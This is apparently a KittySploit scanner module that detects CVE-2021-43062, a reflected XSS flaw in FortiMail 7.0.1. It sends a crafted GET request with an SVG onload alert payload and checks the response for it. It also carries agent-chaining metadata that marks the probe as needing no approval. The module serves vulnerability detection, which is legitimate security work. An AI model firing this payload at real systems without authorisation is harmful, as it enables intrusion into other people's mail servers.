#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A cross-site scripting vulnerability in FortiMail may allow an unauthenticated attacker to perform an attack v."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fortinet FortiMail 7.0.1 - Cross-Site Scripting Detection',
        'description': 'A cross-site scripting vulnerability in FortiMail may allow an unauthenticated attacker to perform an attack via specially crafted HTTP GET requests to the FortiGuard URI protection service.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'fortimail', 'xss', 'fortinet', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2021-43062',
            'https://www.fortiguard.com/psirt/FG-IR-21-185',
            'https://www.exploit-db.com/exploits/50759',
            'https://fortiguard.com/advisory/FG-IR-21-185',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-43062',
    }

    def run(self):
        r = self.http_request(method="GET", path='/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<Svg/onload=alert(document.domain)>', 'FortiMail Click Protection',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Fortinet FortiMail 7.0.1 - Cross-Site Scripting detected",
                path='/fmlurlsvc/?=&url=https%3A%2F%2Fgoogle.com<Svg%2Fonload%3Dalert(document.domain)>',
            )
            return True
        return False

